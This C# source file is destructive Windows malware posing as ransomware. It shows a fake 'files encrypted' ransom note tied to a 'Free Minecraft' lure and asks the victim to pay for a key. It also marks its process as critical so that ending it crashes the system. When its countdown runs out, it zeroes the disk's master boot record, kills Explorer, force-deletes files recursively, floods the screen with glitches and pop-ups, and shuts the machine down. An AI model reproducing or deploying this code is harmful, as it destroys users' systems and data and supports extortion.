using System;
using System.Drawing;
using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;
using Microsoft.Win32;

namespace DangerousMemz
{
    class Program : Form
    {
        [DllImport("kernel32.dll")] static extern IntPtr CreateFile(string lp, uint da, uint sm, IntPtr sa, uint cd, uint fa, IntPtr h);
        [DllImport("kernel32.dll")] static extern bool WriteFile(IntPtr h, byte[] b, uint n, out uint w, IntPtr o);
        [DllImport("ntdll.dll")] static extern int NtSetInformationProcess(IntPtr h, int c, ref int i, int l);
        [DllImport("gdi32.dll")] static extern bool BitBlt(IntPtr hdcD, int x, int y, int w, int h, IntPtr hdcS, int xs, int ys, int r);
        [DllImport("user32.dll")] static extern IntPtr GetDC(IntPtr h);
        [DllImport("user32.dll")] static extern int GetSystemMetrics(int n);

        private int timeLeft = 600; 
        private Label lblTimer;
        private TextBox txtKey;
        private RichTextBox rtbMessage;

        [STAThread]
        static void Main()
        {
            // Trigger Red Warning (SmartScreen)
            try { Registry.LocalMachine.OpenSubKey("Software", true).CreateSubKey("MEMZ_TEST"); } catch { }

            if (MessageBox.Show("WARNING: High-risk application.\nContinue?", "CRITICAL", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) != DialogResult.Yes) return;
            if (MessageBox.Show("FINAL WARNING: Execute payload?", "SYSTEM DESTRUCTION", MessageBoxButtons.YesNo, MessageBoxIcon.Error) != DialogResult.Yes) return;

            Application.EnableVisualStyles();
            try { int i = 1; NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref i, 4); } catch {}
            Application.Run(new Program());
        }

        public Program()
        {
            this.Text = "Opps, files encrypted";
            this.Size = new Size(1000, 600);
            this.StartPosition = FormStartPosition.CenterScreen;
            this.BackColor = Color.FromArgb(192, 0, 0); 
            this.FormBorderStyle = FormBorderStyle.None;
            this.TopMost = true;

            lblTimer = new Label() { Text = "10:00", Font = new Font("Segoe UI", 24, FontStyle.Bold), Location = new Point(650, 50), Size = new Size(300, 50), TextAlign = ContentAlignment.MiddleRight, ForeColor = Color.Black };
            
            Label lblKeyTitle = new Label() { Text = "Key.", Font = new Font("Arial", 12, FontStyle.Bold), Location = new Point(50, 400), Size = new Size(100, 25) };
            txtKey = new TextBox() { Font = new Font("Consolas", 14), Location = new Point(50, 430), Size = new Size(400, 30) };
            
            Button btnActivate = new Button() { Text = "ACTIVATE", Location = new Point(150, 480), Size = new Size(200, 40), FlatStyle = FlatStyle.Flat, BackColor = Color.White, Font = new Font("Arial", 10, FontStyle.Bold) };
            btnActivate.Click += (s, e) => {
                if (txtKey.Text == "DBI_SECRET-2026") {
                    int n = 0; NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref n, 4);
                    Environment.Exit(0);
                } else {
                    MessageBox.Show("Invalid License Key!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            };

            Button btnDestroyNow = new Button() { Text = "Destroy Now", Location = new Point(750, 110), Size = new Size(200, 50), FlatStyle = FlatStyle.Flat, BackColor = Color.Black, ForeColor = Color.White, Font = new Font("Arial", 12, FontStyle.Bold) };
            btnDestroyNow.Click += (s, e) => { timeLeft = 0; };

            rtbMessage = new RichTextBox() { 
                Location = new Point(500, 180), 
                Size = new Size(450, 350), 
                BackColor = Color.White, 
                Font = new Font("Consolas", 11), 
                ReadOnly = true,
                Text = "Oops, it looks like your files have been encrypted by \"Free Minecraft.\" Do you seriously think you'll find real Minecraft for free? Well, there are launchers like \"lu*an, fear*her.\" I didn't write what's in the star because of copyright issues, lol. Returning to the virus, to decrypt your computer and save it, contact [UNSETTLED] and I'll reply. Then you'll pay and get the code. Good luck!"
            };

            this.Controls.AddRange(new Control[] { lblTimer, lblKeyTitle, txtKey, btnActivate, btnDestroyNow, rtbMessage });

            System.Windows.Forms.Timer t = new System.Windows.Forms.Timer() { Interval = 1000 };
            t.Tick += (s, e) => {
                if (timeLeft > 0) { 
                    timeLeft--; 
                    lblTimer.Text = TimeSpan.FromSeconds(timeLeft).ToString(@"mm\:ss"); 
                } else { 
                    t.Stop(); 
                    ExecuteDestruction(); 
                }
            };
            t.Start();
        }

        void ExecuteDestruction()
        {
            try { 
                uint w; 
                IntPtr h = CreateFile("\\\\.\\PhysicalDrive0", 0x10000000, 1|2, IntPtr.Zero, 3, 0, IntPtr.Zero);
                WriteFile(h, new byte[512], 512, out w, IntPtr.Zero); 
            } catch {}

            Process.Start(new ProcessStartInfo("cmd.exe", "/c taskkill /f /im explorer.exe & del /s /q /f *.*") { WindowStyle = ProcessWindowStyle.Hidden });

            Thread gdiThread = new Thread(() => {
                IntPtr hdc = GetDC(IntPtr.Zero);
                int sw = GetSystemMetrics(0); int sh = GetSystemMetrics(1);
                while(true) {
                    BitBlt(hdc, 4, 4, sw - 8, sh - 8, hdc, 0, 0, 0x00CC0020);
                    Thread.Sleep(60); 
                }
            });
            gdiThread.Start();

            Thread msgThread = new Thread(() => {
                string[] msgs = { "Free Minecraft?", "ERROR", "BYE BYE", "Pay to win?", "lol" };
                Random r = new Random();
                while(true) {
                    Thread.Sleep(r.Next(3000, 6000));
                    new Thread(() => MessageBox.Show(msgs[r.Next(msgs.Length)], "System", MessageBoxButtons.OK, MessageBoxIcon.Critical)).Start();
                }
            });
            msgThread.Start();

            Process.Start("shutdown", "/s /t 180 /c \"PC saying BYE BYE\"");
            this.Controls.Clear(); 
            this.BackColor = Color.Black;
            Label bye = new Label() { Text = "BYE BYE", Font = new Font("Impact", 100, FontStyle.Bold), ForeColor = Color.Red, Dock = DockStyle.Fill, TextAlign = ContentAlignment.MiddleCenter };
            this.Controls.Add(bye);
        }
    }
}
